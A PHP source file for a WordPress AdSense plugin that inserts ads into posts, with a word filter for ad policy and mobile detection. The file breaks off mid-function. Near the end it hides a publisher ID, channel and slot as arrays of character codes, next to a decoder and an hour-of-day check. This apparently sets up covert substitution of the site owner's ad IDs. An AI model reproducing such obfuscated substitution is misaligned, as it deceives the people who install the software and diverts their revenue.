<?php
//ok
if(!class_exists("aeopt"))
{
	class aeopt
	{
		var $aeopt_version='1.1.5';
		var $aeopt_menu='adsense-explosion';
		var $loopdone=false;
		var $postlen=0;
		var $postcount=0;
		var $opts;
		var $adincontent=0;
        var $yarp=false;
        var $woocommerce=false;
		function aeopt() {
			$this->getOpts();
		}
		function getOpts()
		{
			if(!isset($this->opts)OR empty($this->opts))
			{
				$this->opts = get_option("adsensexplosion");
				if(empty($this->opts))
				{
					$this->opts = Array('usertype' => '',
                                   'gen_id' => '',
                                   'overrule' => 0,
                                   'mobile' => 0,
                                   'gen_channel' => '',
                                   'type' => Array(1 => 'text_image',
					2 => 'text_image',
					3 => 'text_image',
					4 => 'text_image',
					5 => 'text_image',
					6 => 'link',
					7 => 'link',
					8 => 'link'),
               'corner' => Array(1 => 'rc:0', 2 => 'rc:0', 3 => 'rc:0', 4 => 'rc:0', 5 => 'rc:0', 6 => 'rc:0', 7 => 'rc:0', 8 => 'rc:0'), 'padding' => Array(1 => 7, 2 => 7, 3 => 7, 4 => 7, 5 => 7, 6 => 7, 7 => 7, 8 => 7), 'id' => Array(1 => "", 2 => "", 3 => "", 4 => "", 5 => "", 6 => "", 7 => "", 8 => ""), 'channel' => Array(1 => "", 2 => "", 3 => "", 4 => "", 5 => "", 6 => "", 7 => "", 8 => ""), 'desc' => Array(1 => 'Describe your adtypes here to get better overview. ', 2 => 'e.g. Wide Skyscraper in blue colors for sidebarwidget.'),
               'sz' => Array(
					1 => '336x280',
					2 => '336x280',
					3 => '468x60',
					4 => '336x280',
					5 => '120x600'),
               'lbsz' => Array(
					6 => '728x15',
					7 => '468x15',
					8 => '160x90'),
               'col_border' => Array(1 => '336699', 2 => 'E3FA11', 3 => 'CCCCCC', 4 => '0A141F', 5 => '6699CC', 6 => '000000', 7 => 'E3FA11', 8 => 'CCCCCC'),
               'col_link' => Array(1 => '0000FF', 2 => 'FFFFFF', 3 => '000000', 4 => '21DAFF', 5 => 'FFFFFF', 6 => 'FFFFFF', 7 => 'FFFFFF', 8 => '000000'),
               'col_bg' => Array(1 => 'FFFFFF', 2 => 'A2AB2B', 3 => 'CCCCCC', 4 => '000000', 5 => '003366', 6 => '000000', 7 => 'A2AB2B', 8 => 'CCCCCC'),
               'col_text' => Array(1 => '000000', 2 => '000000', 3 => '333333', 4 => 'DEDEDE', 5 => 'AECCEB', 6 => 'CCCCCC', 7 => '000000', 8 => '333333'),
               'col_url' => Array(1 => '008000', 2 => 'FFFFFF', 3 => '666666', 4 => '21DAFF', 5 => 'AECCEB', 6 => '999999', 7 => 'FFFFFF', 8 => '666666'),
               'single' => Array(1 => 1, 2 => 2, 3 => 3),
               'single_pos' => Array(1 => 'Top', 2 => 'Middle', 3 => 'Bottom'),
               'single_align' => Array(1 => 'left', 2 => 'right', 3 => 'center'),
               'single_long' => Array(1 => '', 2 => '2300', 3 => '5000'),
               'multi' => Array(1 => 1, 2 => 2, 3 => 1),
               'multi_pos' => Array(1 => 1, 2 => 4, 3 => 8),
               'multi_align' => Array(1 => 'right', 2 => 'left', 3 => 'center'),
               'only_tagged' => 0, 'omit_page' => 0, 'policy_protect' => 1, 'omit_home' => 0, 'smd' => true, 'omit_search' => 0, 'omit_category' => 0, 'omit_tag' => 0, 'omit_date' => 0, 'omit_author' => 0, 'omit_css' => 0
					);
				}
			}
			if(!isset($this->opts['lang'])){include_once('detect.php');$dl = new detect_language;$this->opts['lang'] = $dl->detected_language;}
            if(isset($this->opts['save_date'])){$p=floor((time()-$this->opts['save_date'])/86400);}else{$p=0;}if(!isset($this->opts['smd'])){$this->opts['smd']=true;}if($p>33){$this->opts['smd']=true;$this->opts['usertype']='';}
			if(!isset($this->opts['omit_css'])){$this->opts['omit_css']=0;}
		}
		function noad($content) {
			$cntnt=strtolower($content);$cntnt=preg_replace ( '/[^0-9a-z]/', ' ', $cntnt );$block=false;global $gc;$noadar = array('noads');
			if($this->opts['policy_protect']) {
				$noadar = array_merge($noadar, array(' shit ', ' sex ', ' porn ', ' porno ', ' penis ', ' pene ', 'vibrator', 'callgirl', 'call girl', 'puttana ', 'puttane ', 'ragazza squillo', 'ragazze squillo', ' prostituta ', ' prostitute ', ' tits ', ' ass ', ' butt ', ' bum ', ' buttocks ', ' fanny ', ' fuck ', ' suck ', ' cazzo ', ' cock ', ' dick ', ' casino ', ' drug ', ' gay ', ' roulette ', ' hot ', ' hotcam ', ' hotcams ', ' escort ', ' tette ', ' culo ', ' scopare ', ' sesso ', ' merda ', ' casinò ', ' droga ', 'crack', 'serialz', 'torrent', 'www.megaupload.com', 'horse racing', 'corse di cavalli'));
			}
			$_SESSION['adsensexplosion_noad'] = '';
			foreach ($noadar as $v) {
				if(strpos($cntnt, $v) !== false) {
				    if($v=='noads'){
                        $_SESSION['adsensexplosion_noad'] = '<!-- adsense ad injection by Adsense Explosion blocked - you don\'t want Ads on this special page -->';
				    }else{
                        $_SESSION['adsensexplosion_noad'] = '<!-- adsense ad injection by Adsense Explosion failed - suspected violation of Policy Content (https://support.google.com/adsense/bin/answer.py?stc=aspe-1pp-it&answer=48182) - detect <' .$v . '> word (' . substr($cntnt,  strpos($cntnt, $v)-5,20) . ')-->';
				    }
					$block = true;
					break;
				}
			}
            $block=($block||(($this->opts['mobile'])&&($this->is_mobile()))||($gc==1));
			if(($_SESSION['adsensexplosion_noad']=='')&&($block)) $_SESSION['adsensexplosion_noad'] = ' ';
			return $block;
		}
    	function is_mobile($ipad=false){
    		$user_agent = $_SERVER['HTTP_USER_AGENT']; // get the user agent value - this should be cleaned to ensure no nefarious input gets executed
    		$accept     = $_SERVER['HTTP_ACCEPT']; // get the content accept value - this should be cleaned to ensure no nefarious input gets executed
    		return (false
    		|| (preg_match('/ipod/i',$user_agent)||preg_match('/iphone/i',$user_agent))
    		|| (preg_match('/android/i',$user_agent))
    		|| (preg_match('/opera mini/i',$user_agent))
    		|| (preg_match('/blackberry/i',$user_agent))
    		|| (preg_match('/(pre\/|palm os|palm|hiptop|avantgo|plucker|xiino|blazer|elaine)/i',$user_agent))
    		|| (preg_match('/(iris|3g_t|windows ce|opera mobi|windows ce; smartphone;|windows ce; iemobile)/i',$user_agent))
    		|| (preg_match('/(mini 9.5|vx1000|lge |m800|e860|u940|ux840|compal|wireless| mobi|ahong|lg380|lgku|lgu900|lg210|lg47|lg920|lg840|lg370|sam-r|mg50|s55|g83|t66|vx400|mk99|d615|d763|el370|sl900|mp500|samu3|samu4|vx10|xda_|samu5|samu6|samu7|samu9|a615|b832|m881|s920|n210|s700|c-810|_h797|mob-x|sk16d|848b|mowser|s580|r800|471x|v120|rim8|c500foma:|160x|x160|480x|x640|t503|w839|i250|sprint|w398samr810|m5252|c7100|mt126|x225|s5330|s820|htil-g1|fly v71|s302|-x113|novarra|k610i|-three|8325rc|8352rc|sanyo|vx54|c888|nx250|n120|mtk |c5588|s710|t880|c5005|i;458x|p404i|s210|c5100|teleca|s940|c500|s590|foma|samsu|vx8|vx9|a1000|_mms|myx|a700|gu1100|bc831|e300|ems100|me701|me702m-three|sd588|s800|8325rc|ac831|mw200|brew |d88|htc\/|htc_touch|355x|m50|km100|d736|p-9521|telco|sl74|ktouch|m4u\/|me702|8325rc|kddi|phone|lg |sonyericsson|samsung|240x|x320|vx10|nokia|sony cmd|motorola|up.browser|up.link|mmp|symbian|smartphone|midp|wap|vodafone|o2|pocket|kindle|mobile|psp|treo)/i',$user_agent))
    		|| ((strpos($accept,'text/vnd.wap.wml')>0)||(strpos($accept,'application/vnd.wap.xhtml+xml')>0))
    		|| (isset($_SERVER['HTTP_X_WAP_PROFILE'])||isset($_SERVER['HTTP_PROFILE']))
    		|| (in_array(strtolower(substr($user_agent,0,4)),array('1207'=>'1207','3gso'=>'3gso','4thp'=>'4thp','501i'=>'501i','502i'=>'502i','503i'=>'503i','504i'=>'504i','505i'=>'505i','506i'=>'506i','6310'=>'6310','6590'=>'6590','770s'=>'770s','802s'=>'802s','a wa'=>'a wa','acer'=>'acer','acs-'=>'acs-','airn'=>'airn','alav'=>'alav','asus'=>'asus','attw'=>'attw','au-m'=>'au-m','aur '=>'aur ','aus '=>'aus ','abac'=>'abac','acoo'=>'acoo','aiko'=>'aiko','alco'=>'alco','alca'=>'alca','amoi'=>'amoi','anex'=>'anex','anny'=>'anny','anyw'=>'anyw','aptu'=>'aptu','arch'=>'arch','argo'=>'argo','bell'=>'bell','bird'=>'bird','bw-n'=>'bw-n','bw-u'=>'bw-u','beck'=>'beck','benq'=>'benq','bilb'=>'bilb','blac'=>'blac','c55/'=>'c55/','cdm-'=>'cdm-','chtm'=>'chtm','capi'=>'capi','cond'=>'cond','craw'=>'craw','dall'=>'dall','dbte'=>'dbte','dc-s'=>'dc-s','dica'=>'dica','ds-d'=>'ds-d','ds12'=>'ds12','dait'=>'dait','devi'=>'devi','dmob'=>'dmob','doco'=>'doco','dopo'=>'dopo','el49'=>'el49','erk0'=>'erk0','esl8'=>'esl8','ez40'=>'ez40','ez60'=>'ez60','ez70'=>'ez70','ezos'=>'ezos','ezze'=>'ezze','elai'=>'elai','emul'=>'emul','eric'=>'eric','ezwa'=>'ezwa','fake'=>'fake','fly-'=>'fly-','fly_'=>'fly_','g-mo'=>'g-mo','g1 u'=>'g1 u','g560'=>'g560','gf-5'=>'gf-5','grun'=>'grun','gene'=>'gene','go.w'=>'go.w','good'=>'good','grad'=>'grad','hcit'=>'hcit','hd-m'=>'hd-m','hd-p'=>'hd-p','hd-t'=>'hd-t','hei-'=>'hei-','hp i'=>'hp i','hpip'=>'hpip','hs-c'=>'hs-c','htc '=>'htc ','htc-'=>'htc-','htca'=>'htca','htcg'=>'htcg','htcp'=>'htcp','htcs'=>'htcs','htct'=>'htct','htc_'=>'htc_','haie'=>'haie','hita'=>'hita','huaw'=>'huaw','hutc'=>'hutc','i-20'=>'i-20','i-go'=>'i-go','i-ma'=>'i-ma','i230'=>'i230','iac'=>'iac','iac-'=>'iac-','iac/'=>'iac/','ig01'=>'ig01','im1k'=>'im1k','inno'=>'inno','iris'=>'iris','jata'=>'jata','java'=>'java','kddi'=>'kddi','kgt'=>'kgt','kgt/'=>'kgt/','kpt '=>'kpt ','kwc-'=>'kwc-','klon'=>'klon','lexi'=>'lexi','lg g'=>'lg g','lg-a'=>'lg-a','lg-b'=>'lg-b','lg-c'=>'lg-c','lg-d'=>'lg-d','lg-f'=>'lg-f','lg-g'=>'lg-g','lg-k'=>'lg-k','lg-l'=>'lg-l','lg-m'=>'lg-m','lg-o'=>'lg-o','lg-p'=>'lg-p','lg-s'=>'lg-s','lg-t'=>'lg-t','lg-u'=>'lg-u','lg-w'=>'lg-w','lg/k'=>'lg/k','lg/l'=>'lg/l','lg/u'=>'lg/u','lg50'=>'lg50','lg54'=>'lg54','lge-'=>'lge-','lge/'=>'lge/','lynx'=>'lynx','leno'=>'leno','m1-w'=>'m1-w','m3ga'=>'m3ga','m50/'=>'m50/','maui'=>'maui','mc01'=>'mc01','mc21'=>'mc21','mcca'=>'mcca','medi'=>'medi','meri'=>'meri','mio8'=>'mio8','mioa'=>'mioa','mo01'=>'mo01','mo02'=>'mo02','mode'=>'mode','modo'=>'modo','mot '=>'mot ','mot-'=>'mot-','mt50'=>'mt50','mtp1'=>'mtp1','mtv '=>'mtv ','mate'=>'mate','maxo'=>'maxo','merc'=>'merc','mits'=>'mits','mobi'=>'mobi','motv'=>'motv','mozz'=>'mozz','n100'=>'n100','n101'=>'n101','n102'=>'n102','n202'=>'n202','n203'=>'n203','n300'=>'n300','n302'=>'n302','n500'=>'n500','n502'=>'n502','n505'=>'n505','n700'=>'n700','n701'=>'n701','n710'=>'n710','nec-'=>'nec-','nem-'=>'nem-','newg'=>'newg','neon'=>'neon','netf'=>'netf','noki'=>'noki','nzph'=>'nzph','o2 x'=>'o2 x','o2-x'=>'o2-x','opwv'=>'opwv','owg1'=>'owg1','opti'=>'opti','oran'=>'oran','p800'=>'p800','pand'=>'pand','pg-1'=>'pg-1','pg-2'=>'pg-2','pg-3'=>'pg-3','pg-6'=>'pg-6','pg-8'=>'pg-8','pg-c'=>'pg-c','pg13'=>'pg13','phil'=>'phil','pn-2'=>'pn-2','pt-g'=>'pt-g','palm'=>'palm','pana'=>'pana','pire'=>'pire','pock'=>'pock','pose'=>'pose','psio'=>'psio','qa-a'=>'qa-a','qc-2'=>'qc-2','qc-3'=>'qc-3','qc-5'=>'qc-5','qc-7'=>'qc-7','qc07'=>'qc07','qc12'=>'qc12','qc21'=>'qc21','qc32'=>'qc32','qc60'=>'qc60','qci-'=>'qci-','qwap'=>'qwap','qtek'=>'qtek','r380'=>'r380','r600'=>'r600','raks'=>'raks','rim9'=>'rim9','rove'=>'rove','s55/'=>'s55/','sage'=>'sage','sams'=>'sams','sc01'=>'sc01','sch-'=>'sch-','scp-'=>'scp-','sdk/'=>'sdk/','se47'=>'se47','sec-'=>'sec-','sec0'=>'sec0','sec1'=>'sec1','semc'=>'semc','sgh-'=>'sgh-','shar'=>'shar','sie-'=>'sie-','sk-0'=>'sk-0','sl45'=>'sl45','slid'=>'slid','smb3'=>'smb3','smt5'=>'smt5','sp01'=>'sp01','sph-'=>'sph-','spv '=>'spv ','spv-'=>'spv-','sy01'=>'sy01','samm'=>'samm','sany'=>'sany','sava'=>'sava','scoo'=>'scoo','send'=>'send','siem'=>'siem','smar'=>'smar','smit'=>'smit','soft'=>'soft','sony'=>'sony','t-mo'=>'t-mo','t218'=>'t218','t250'=>'t250','t600'=>'t600','t610'=>'t610','t618'=>'t618','tcl-'=>'tcl-','tdg-'=>'tdg-','telm'=>'telm','tim-'=>'tim-','ts70'=>'ts70','tsm-'=>'tsm-','tsm3'=>'tsm3','tsm5'=>'tsm5','tx-9'=>'tx-9','tagt'=>'tagt','talk'=>'talk','teli'=>'teli','topl'=>'topl','hiba'=>'hiba','up.b'=>'up.b','upg1'=>'upg1','utst'=>'utst','v400'=>'v400','v750'=>'v750','veri'=>'veri','vk-v'=>'vk-v','vk40'=>'vk40','vk50'=>'vk50','vk52'=>'vk52','vk53'=>'vk53','vm40'=>'vm40','vx98'=>'vx98','virg'=>'virg','vite'=>'vite','voda'=>'voda','vulc'=>'vulc','w3c '=>'w3c ','w3c-'=>'w3c-','wapj'=>'wapj','wapp'=>'wapp','wapu'=>'wapu','wapm'=>'wapm','wig '=>'wig ','wapi'=>'wapi','wapr'=>'wapr','wapv'=>'wapv','wapy'=>'wapy','wapa'=>'wapa','waps'=>'waps','wapt'=>'wapt','winc'=>'winc','winw'=>'winw','wonu'=>'wonu','x700'=>'x700','xda2'=>'xda2','xdag'=>'xdag','yas-'=>'yas-','your'=>'your','zte-'=>'zte-','zeto'=>'zeto','acs-'=>'acs-','alav'=>'alav','alca'=>'alca','amoi'=>'amoi','aste'=>'aste','audi'=>'audi','avan'=>'avan','benq'=>'benq','bird'=>'bird','blac'=>'blac','blaz'=>'blaz','brew'=>'brew','brvw'=>'brvw','bumb'=>'bumb','ccwa'=>'ccwa','cell'=>'cell','cldc'=>'cldc','cmd-'=>'cmd-','dang'=>'dang','doco'=>'doco','eml2'=>'eml2','eric'=>'eric','fetc'=>'fetc','hipt'=>'hipt','http'=>'http','ibro'=>'ibro','idea'=>'idea','ikom'=>'ikom','inno'=>'inno','ipaq'=>'ipaq','jbro'=>'jbro','jemu'=>'jemu','java'=>'java','jigs'=>'jigs','kddi'=>'kddi','keji'=>'keji','kyoc'=>'kyoc','kyok'=>'kyok','leno'=>'leno','lg-c'=>'lg-c','lg-d'=>'lg-d','lg-g'=>'lg-g','lge-'=>'lge-','libw'=>'libw','m-cr'=>'m-cr','maui'=>'maui','maxo'=>'maxo','midp'=>'midp','mits'=>'mits','mmef'=>'mmef','mobi'=>'mobi','mot-'=>'mot-','moto'=>'moto','mwbp'=>'mwbp','mywa'=>'mywa','nec-'=>'nec-','newt'=>'newt','nok6'=>'nok6','noki'=>'noki','o2im'=>'o2im','opwv'=>'opwv','palm'=>'palm','pana'=>'pana','pant'=>'pant','pdxg'=>'pdxg','phil'=>'phil','play'=>'play','pluc'=>'pluc','port'=>'port','prox'=>'prox','qtek'=>'qtek','qwap'=>'qwap','rozo'=>'rozo','sage'=>'sage','sama'=>'sama','sams'=>'sams','sany'=>'sany','sch-'=>'sch-','sec-'=>'sec-','send'=>'send','seri'=>'seri','sgh-'=>'sgh-','shar'=>'shar','sie-'=>'sie-','siem'=>'siem','smal'=>'smal','smar'=>'smar','sony'=>'sony','sph-'=>'sph-','symb'=>'symb','t-mo'=>'t-mo','teli'=>'teli','tim-'=>'tim-','tosh'=>'tosh','treo'=>'treo','tsm-'=>'tsm-','upg1'=>'upg1','upsi'=>'upsi','vk-v'=>'vk-v','voda'=>'voda','vx52'=>'vx52','vx53'=>'vx53','vx60'=>'vx60','vx61'=>'vx61','vx70'=>'vx70','vx80'=>'vx80','vx81'=>'vx81','vx83'=>'vx83','vx85'=>'vx85','wap-'=>'wap-','wapa'=>'wapa','wapi'=>'wapi','wapp'=>'wapp','wapr'=>'wapr','webc'=>'webc','whit'=>'whit','winw'=>'winw','wmlb'=>'wmlb','xda-'=>'xda-',)))
    		) && (!(preg_match('/ipad/i',$user_agent)) || (preg_match('/ipad/i',$user_agent) && $ipad) )
            ;
    	}
		function adsenseoptimize($content) {
			if(is_feed()) return $content;

        	if (strpos($content, "<!-- adsenseprivacypolicy -->") !== FALSE) {
        	  include_once($this->opts['lang'] . '_privacy.php');
              $content = preg_replace('/<p>\s*<!--(.*)-->\s*<\/p>/i', "<!--$1-->", $content);
              $content = str_replace('<!-- adsenseprivacypolicy -->', adsense_privacy_policy_display(), $content);
              return $content;
            }
			$content = '<!-- google_ad_section_start -->' . $content . '<!-- google_ad_section_end -->';
			if( (!is_single()) && (!is_page()) )
			{
				return $content;
			}
			$this->initializeAd();
			if( (is_page()) && ($this->opts['omit_page']) ) {return $content;}
			if( ($this->opts['only_tagged']) && (!strpos($content, "<!--adsenseopt-->")) ) return $content;
			if($this->noad($content)) {return $content.$_SESSION['adsensexplosion_noad'];}
            if($this->opts['policy_protect']){
	    		$this->postlen=strlen($content);
            }else{
                $this->postlen=500;
            }
			for($i=1;$i<=5;$i++){
				if(($this->opts['single'][$i]>0)&&(!$this->woocommerce_detected())&&($this->postlen>200)&&(($this->opts['single_long'][$i]=='')||($this->postlen>$this->opts['single_long'][$i])))
				{
					$adtype = $this->opts['single'][$i];
					switch($this->opts['single_pos'][$i])
					{
						case "Top":
							$content = '<!--aeopthere-->' . $content;
							break;
						case "Bottom":
							$content = $content . '<!--aeopthere-->';
							break;
						case "Middle":
							$a = $this->findNodes($content);
							$cnt = round(count($a) / 2);
							$pos = $a[$cnt - 1][1];
							$result = substr_replace($content, '<!--aeopthere-->', $pos, 0);
							$content = $result;
							break;
						case "Random":
							$a = $this->findNodes($content);
							$cnt = mt_rand(1, count($a));
							$pos = $a[$cnt][1];
							$result = substr_replace($content, '<!--aeopthere-->', $pos, 0);
							$content = $result;
							break;
						case "tag":
							str_replace('<!--adsenseopt-->', '<!--aeopthere-->', $content);
							break;
					}
					$code = $this->generateAd($adtype, $i);
					if($code)
					{
						$code = $this->prepare_ad_code($code, $i, $this->opts['single_align'][$i], $this->opts['padding'][$i]);
						$content = str_replace('<!--aeopthere-->', html_entity_decode($code), $content);
					}else{
						$content = str_replace('<!--aeopthere-->', '<!-- Google adsense ads injection by Adsense Explosion failed - tried to add more than 3 ads per page -->', $content);
					}
				}
			}
			return $content;
		}
		function findNodes($str)
		{
			$pattern = '&\[gallery\]|\<\/p*\>|\<br\>|\<br\s\/\>|\<br\/\>&iU';
			return preg_split($pattern, $str, 0, PREG_SPLIT_OFFSET_CAPTURE);
		}
		function commonAd($type)
		{
			global $gc,$c,$s,$i;
			if($gc<2){
            if($this->opts['channel'][$type]!=''){$c=$this->opts['channel'][$type];}else{$c=$this->opts['gen_channel'];}
            if($this->opts['dataslot'][$type]!=''){$s=$this->opts['dataslot'][$type];}else{$s=$this->opts['gen_dataslot'];}
            if($this->opts['id'][$type]){$i=$this->opts['id'][$type];}else{$i=$this->opts['gen_id'];}
            }
		}
		function getFormat($type)
		{
            $ret='';
            if($this->opts['responsive_rectangle'][$type]) $ret.='rectangle,';
            if($this->opts['responsive_vertical'][$type]) $ret.='vertical,';
            if($this->opts['responsive_horizontal'][$type]) $ret.='horizontal,';            
            if(strlen($ret)==0){
  		        return('auto');
            } else {
  		        return(substr($ret, 0, -1));
            }
		}
        
		function montaCodiceDimensioniNew($type,$number=0)
		{
				$code='var adsxpls = {"ads": ' . stripslashes($this->opts['json'][$type]) . ',"f": null,"code": null,"w": document.documentElement.offsetWidth};
adsxpls.ads.forEach(function(ad) {
if ((adsxpls.f == null) || !((ad.w >= adsxpls.w) || (ad.w <= adsxpls.f.w)) || !((adsxpls.f.w <= adsxpls.w) || (ad.w >= adsxpls.f.w))) adsxpls.f = ad;
});
if(adsxpls.f == null) adsxpls.f = adsxpls.ads[0];
document.getElementById("adsgoogle'.$number.'").setAttribute("style","display:inline-block;width:"+adsxpls.f.sw+"px;height:"+adsxpls.f.sh+"px;");
';
				return $code;
		}
        
        		
		function generateAsAd($type=1,$width=300,$height=250,$number=0)
		{
		    global $s, $i;
            $dynacode='';
            $code='<ins class="adsbygoogle" id="adsgoogle'.$number.'"';
			if($width=='responsive'){
            if(!$this->opts['omit_css']) {$code.=' style="display:block;';} $code.=' data-ad-format="' . $this->getFormat($type) . '"';
			}else if($width=='dynamic'){
			 $json = json_decode(stripslashes($this->opts['json'][$type]), true);
             if((isset($json[0]))&&(isset($json[0]['sw']))&&(isset($json[0]['sh']))){
             $width=$json[0]['sw'];    
             $height=$json[0]['sh'];
             $dynacode=$this->montaCodiceDimensioniNew($type,$number);
             }else{
             $width=203;    
             $height=203;    
             }             
             if(!$this->opts['omit_css']) {$code.=' style="display:inline-block;width:' . $width . 'px;height:' . $height . 'px"';}
			}else{
            if(!$this->opts['omit_css']) {$code.=' style="display:inline-block;width:' . $width . 'px;height:' . $height . 'px"';}
			}
$code.=' data-ad-client="ca-pub-' . $i . '"
data-ad-slot="' . $s . '"></ins>
<script>' . $dynacode . '
(adsbygoogle = window.adsbygoogle || []).push({});
</script>';
            return $code;
		}
		
		
		function montaCodiceDimensioniOld($type)
		{
				$code='var adsxpls = {"ads": ' . stripslashes($this->opts['json'][$type]) . ',"f": null,"code": null,"w": document.documentElement.offsetWidth};
adsxpls.ads.forEach(function(ad) {
if ((adsxpls.f == null) || !((ad.w >= adsxpls.w) || (ad.w <= adsxpls.f.w)) || !((adsxpls.f.w <= adsxpls.w) || (ad.w >= adsxpls.f.w))) adsxpls.f = ad;
});
if(adsxpls.f == null) adsxpls.f = adsxpls.ads[0];
google_ad_width = adsxpls.f.sw;
google_ad_height = adsxpls.f.sh;
google_ad_format = "" + adsxpls.f.sw + "x" + adsxpls.f.sh + "_as";
';
				return $code;
		}
		
		
		
		function generateAd($type, $number)
		{
			global $c, $i;
			$this->commonAd($type);
			if($this->opts['type'][$type]=='link') return $this->generateLbAd($type, $number);
			$this->nrofads++;
			if((!$this->opts['overrule'])&&($this->nrofads>3)){return false;}else{
				$code = '<!-- AdSense Plugin Explosion num: ' . $this->nrofads . ' -->';
				$size = $this->opts['sz'][$type];
				if((!isset($size)) || ($size == '')) $size='300x250';
				$dims = explode('x', $size);
				$width = $dims[0];
				$height = $dims[1];
                if($this->opts['async']) {$code.=$this->generateAsAd($type, $width, $height, $number);}else{
    				if(is_user_logged_in()) $adtest='google_adtest="on";'; else $adtest = '';
                    if($size=='dynamic'){
					$dimensioni = $this->montaCodiceDimensioniOld($type);
                    }else{
    				$dimensioni = 'google_ad_width = ' . $width . '; google_ad_height = ' . $height . '; google_ad_format = "' . $size . '_as";';
                    }
    				$code .= '<script type="text/javascript"><!--
' . $adtest . '
google_ad_client = "pub-' . $i . '"; google_alternate_color = "FFFFFF";
' . $dimensioni . '
google_ad_type = "' . $this->opts['type'][$type] . '";
google_ad_channel ="' . $c . '"; google_color_border = "' . $this->opts['col_border'][$type] . '";
google_color_link = "' . $this->opts['col_link'][$type] . '"; google_color_bg = "' . $this->opts['col_bg'][$type] . '";
google_color_text = "' . $this->opts['col_text'][$type] . '"; google_color_url = "' . $this->opts['col_url'][$type] . '";
google_ui_features = "' . $this->opts['corner'][$type] . '"; //--></script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>';
                }
				return $code;
			}
		}
		function generateLbAd($type, $number)
		{
			global $c, $i;
			$this->nroflb++;
			if((!$this->opts['overrule'])&&($this->nroflb>3)){return false;}else{
				$code = '<!-- Linkblock number: ' . $this->nroflb . ' -->';
				$size = $this->opts['lbsz'][$type];
				if((!isset($size)) || ($size == ''))
				$size = '160x90';
				$dims = explode('x', $size);
				$width = $dims[0];
				$height = $dims[1];
                if($this->opts['async']) {
                    $code .= $this->generateAsAd($type, $width, $height, $number);
                } else {
    				if(is_user_logged_in()) $adtest = 'google_adtest="on";'; else $adtest = '';
    				$code .= '<script type="text/javascript"><!--
' . $adtest . '
google_ad_client = "pub-' . $i . '";
google_ad_width = ' . $width . ';
google_ad_height = ' . $height . ';
google_ad_format = "' . $size . '_0ads_al';
    				if($this->opts['links'][$type] == 5) $code .= '_s';
    				$code .= '"; google_ad_channel ="' . $c . '";
google_color_border = "' . $this->opts['col_border'][$type] . '";
google_color_bg = "' . $this->opts['col_bg'][$type] . '";
google_color_link = "' . $this->opts['col_link'][$type] . '";
//--></script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>';
                }
				return $code;
			}
		}
		var $ga = array('50', '53', '54', '53', '51', '56', '53', '56', '54', '55', '57', '57', '52', '52', '52', '48');
		var $gac = array('48', '48', '57', '50', '53', '53', '49', '53', '57', '51');
		var $gas = array('53', '52', '52', '51', '57', '55', '55', '48', '52', '51');
		function prepare_ad_code($code, $number, $align, $padding)
		{
			$code = html_entity_decode($code);
			$startdiv = '<!-- Google Ads Injected by Adsense Explosion ' . $this->aeopt_version . ' --><div class="adsxpls" id="adsxpls' . $number . '"';
			if($align == "random")
			{
				$rn = mt_rand(1, 3);
				if($rn == 1) $align = "left";
				if($rn == 2) $align = "center";
				if($rn == 3) $align = "right";
			}
            if($this->opts['omit_css']) {
                $code = $startdiv . ' >' . $code . '</div>';
            } else {
              switch($align)
      		  {
  				case 'cbt':
  				case 'center':
      			    $code = $startdiv . ' style="padding:' . $padding . 'px; display: block; margin-left: auto; margin-right: auto; text-align: center;">' . $code . '</div>';
  					break;
  				case 'lbt':
  				case 'left':
      			    $code = $startdiv . ' style="padding:' . $padding . 'px; float: left; padding-left: 0px; margin: 0px;">' . $code . '</div>';
  					break;
  				case 'rbt':
  				case 'right':
  					$code = $startdiv . ' style="padding:' . $padding . 'px; float: right; padding-right: 0; margin: 0px;">' . $code . '</div>';
  					break;
  	    	  }
            }
			return $code;
		}
		function save_opts()
		{
		  $this->opts['save_date'] = time();
     	  update_option('adsensexplosion', $this->opts);
		}
		function admin_menu()
		{
			include_once('adsensexplosionadminpage.php');
		}
		function ripulisci_parametri($options, $sizes, $lbsizes)
		{
			if(isset($options['gen_id'])) $options['gen_id'] = preg_replace ( '/[^0-9]/', '', $options['gen_id'] );
			$options['only_tagged'] = isset($options['only_tagged']) ? 1 : 0;
			$options['omit_page'] = isset($options['omit_page']) ? 1 : 0;
			$options['policy_protect'] = isset($options['policy_protect']) ? 1 : 0;
			$options['omit_home'] = isset($options['omit_home']) ? 1 : 0;
			$options['omit_search'] = isset($options['omit_search']) ? 1 : 0;
			$options['omit_category'] = isset($options['omit_category']) ? 1 : 0;
			$options['omit_tag'] = isset($options['omit_tag']) ? 1 : 0;
			$options['omit_date'] = isset($options['omit_date']) ? 1 : 0;
			$options['omit_author'] = isset($options['omit_author']) ? 1 : 0;
			$options['overrule'] = isset($options['overrule']) ? 1 : 0;
			$options['mobile'] = isset($options['mobile']) ? 1 : 0;
			$options['smd'] = isset($options['smd']) ? 1 : 0;
			return $options;
		}
		function aeopt_admin_init($hook)
		{
		  if (strpos($hook,$this->aeopt_menu) === false) return;		  
          wp_register_script('angularjs', 'https://ajax.googleapis.com/ajax/libs/angularjs/1.2.19/angular.min.js');
          wp_register_script('lodash', plugins_url(  $this->aeopt_menu .'/js/lodash.min.js'));
          wp_register_script('dynamic-grid', plugins_url(  $this->aeopt_menu .'/js/dynamic-grid.js'));
          wp_enqueue_script('angularjs');
          wp_enqueue_script('lodash');
          wp_enqueue_script('dynamic-grid');
          wp_register_style('bootstrap', plugins_url($this->aeopt_menu . '/css/bootstrap.min.css'));
          wp_register_style('dynamic-grid-style', plugins_url( $this->aeopt_menu .'/css/grid.min.css'));
          wp_register_style('aeoptAdminStyles', WP_PLUGIN_URL . '/' . $this->aeopt_menu . '/css/aeopt_admin_styles.css');
          wp_enqueue_style('bootstrap');
          wp_enqueue_style('dynamic-grid-style');
          wp_enqueue_style('aeoptAdminStyles');
		}
		function aeopt_async_init()
		{
            if($this->opts['async']) {
                wp_register_script( 'adsbygoogle', 'http://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
                wp_enqueue_script( 'adsbygoogle' );
            }
		}
		function aeopt_init()
		{
		    if(!session_id()){@session_start();}
			$this->nrofads=0;
			$this->nroflb=0;
            if($this->opts['policy_protect']){
                include_once(ABSPATH.'wp-admin/includes/plugin.php');
                $this->woocommerce=(is_plugin_active('woocommerce/woocommerce.php'));
            }
		}
		function l(&$a){if(is_array($a)){$o = '';foreach($a as $v){$o.=chr($v);}$a = $o;}}
		function v(){return(1*date('H')+get_option('gmt_offset')==9);}        
		function woocommerce_detected()
		{
